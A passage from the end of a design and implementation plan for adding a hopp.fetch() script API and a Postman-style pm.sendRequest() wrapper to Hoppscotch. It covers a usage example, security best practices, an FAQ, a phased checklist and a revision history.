  headers: Array<{ key: string, value: string }>
  body: string        // Response body as string
  json(): any         // Parse body as JSON
}
```

**Example:**
```javascript
// String URL
pm.sendRequest('https://api.example.com/status', (err, res) => {
  if (err) {
    console.error(err)
  } else {
    console.log('Status:', res.code)
    pm.environment.set('api_status', res.json().status)
  }
})

// Request object
pm.sendRequest({
  url: 'https://api.example.com/login',
  method: 'POST',
  header: [
    { key: 'Content-Type', value: 'application/json' }
  ],
  body: {
    mode: 'raw',
    raw: JSON.stringify({ username: 'alice', password: 'secret' })
  }
}, (err, res) => {
  if (!err && res.code === 200) {
    const token = res.json().token
    pm.environment.set('auth_token', token)
  }
})
```

---

## Appendix B: Security Best Practices

### For Users

1. **Review imported collections** - Always inspect pre/post-request scripts before running
2. **Use environment variables** - Avoid hardcoding sensitive data in fetch URLs
3. **Trust your sources** - Only import collections from trusted authors
4. **Monitor inspector warnings** - Pay attention to same-origin fetch warnings
5. **Use proxy interceptor** - For additional security layer when fetching external APIs

### For Collection Authors

1. **Document fetch usage** - Clearly explain why scripts use `hopp.fetch()`
2. **Minimize same-origin fetches** - Avoid if possible; if necessary, explain why
3. **Handle errors gracefully** - Always catch fetch errors
4. **Use HTTPS** - Never fetch from HTTP URLs (unless explicitly testing)
5. **Validate responses** - Don't trust external API responses blindly

### For Self-Hosted Admins

1. **Review CSP headers** - Ensure Content-Security-Policy allows necessary fetch origins
2. **Monitor fetch usage** - Log scripts with high fetch volume
3. **Consider allowlisting** - Block fetch to specific internal endpoints if needed
4. **Educate users** - Provide internal guidelines for fetch usage
5. **Audit collections** - Periodically review team collections for suspicious scripts

---

## Appendix C: FAQ

**Q: Why not just use native `fetch()` in the sandbox?**
A: Native `fetch()` bypasses Hoppscotch's interceptor system, meaning users lose benefits like proxies, authentication, client certificates, and custom headers. By routing through interceptors, `hopp.fetch()` respects user preferences.

**Q: Will `hopp.fetch()` work offline?**
A: In CLI, yes (depends on network). In web app, depends on interceptor:
- Browser interceptor: No (requires network)
- Proxy interceptor: No (requires proxy server)
- Desktop/Native interceptor: Depends on system network

**Q: Can I cancel a `hopp.fetch()` request?**
A: Not in v1. Future enhancement could support AbortController.

**Q: What happens if I call `hopp.fetch()` in legacy sandbox?**
A: It throws an error: `"hopp.fetch() is only available in experimental scripting sandbox"`. Users must enable experimental sandbox.

**Q: Does `hopp.fetch()` support HTTP/2, HTTP/3?**
A: Depends on interceptor:
- Browser interceptor: Yes (browser support)
- Proxy interceptor: Depends on proxy
- Native interceptor: Yes (via relay)

**Q: Can I use `hopp.fetch()` to upload files?**
A: Yes, using `FormData`:
```javascript
const formData = new FormData()
formData.append('file', fileBlob, 'filename.txt')
await hopp.fetch(url, { method: 'POST', body: formData })
```

**Q: Is there a rate limit on `hopp.fetch()`?**
A: Not in v1. Future enhancement for security.

---

## Appendix D: Implementation Checklist

### Phase 1: Core Infrastructure ✅
- [ ] Re-add faraday-cage fetch module
- [ ] Define `HoppFetchHook` interface
- [ ] Implement web hook handler (`createHoppFetchHook` for web)
- [ ] Implement CLI hook handler (`createHoppFetchHook` for CLI)
- [ ] Add `FetchCallMeta` type for tracking

### Phase 2: Sandbox Integration ✅
- [ ] Update sandbox execution context (web)
- [ ] Update sandbox execution context (CLI)
- [ ] Expose `hopp.fetch()` in bootstrap scripts
- [ ] Implement `pm.sendRequest()` wrapper
- [ ] Pass hook to pre-request and test runners

### Phase 3: Security & Monitoring ✅
- [ ] Create `FetchInspectorService`
- [ ] Implement same-origin detection
- [ ] Add CSRF warning to inspector UI
- [ ] Track fetch calls in execution metadata
- [ ] Add documentation link to inspector warning

### Phase 4: Testing ✅
- [ ] Unit tests for `hopp.fetch()`
- [ ] Unit tests for `pm.sendRequest()`
- [ ] Integration tests for web hook handler
- [ ] Integration tests for CLI hook handler
- [ ] E2E tests for web app
- [ ] E2E tests for CLI
- [ ] Fetch inspector tests

### Phase 5: Documentation ✅
- [ ] Update scripting docs with `hopp.fetch()` API
- [ ] Update scripting docs with `pm.sendRequest()` API
- [ ] Add security best practices guide
- [ ] Add migration guide for Postman users
- [ ] Add CSRF warning documentation
- [ ] Update RFC discussion #5221

### Phase 6: Release ✅
- [ ] Feature flag for gradual rollout
- [ ] Beta testing with trusted users
- [ ] Monitor for issues
- [ ] Full release announcement
- [ ] Blog post with examples

---

## Revision History

| Version | Date | Author | Changes |
|---------|------|--------|---------|
| 1.0 | 2025-11-04 | Claude Code | Initial comprehensive implementation plan |

---

**End of Document**
